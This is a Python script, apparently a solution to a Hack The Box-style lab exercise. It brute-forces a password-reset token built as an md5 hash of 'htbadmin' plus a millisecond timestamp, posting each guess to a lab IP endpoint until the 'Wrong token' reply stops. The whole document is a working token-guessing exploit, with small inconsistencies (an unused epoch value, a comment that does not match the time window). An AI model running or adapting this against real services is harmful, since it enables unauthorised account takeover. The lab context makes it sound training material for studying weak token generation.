from hashlib import md5
import requests
from sys import exit
import time
from datetime import datetime

url = "http://64.227.43.207:31746/question1/"

# to have a wide window try to bruteforce starting from 120seconds ago.

date_time = '2022-09-25 09:25:10'
pattern = '%Y-%m-%d %H:%M:%S'
epoch = int(time.mktime(time.strptime(date_time, pattern))*1000 )
print(epoch)

now        = int(time.time()*1000)# int(time())
start_time = now - 1200
fail_text  = "Wrong token"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, now + 1200):
    # get token md5
    md5_token = md5(("htbadmin"+str(x)).encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()

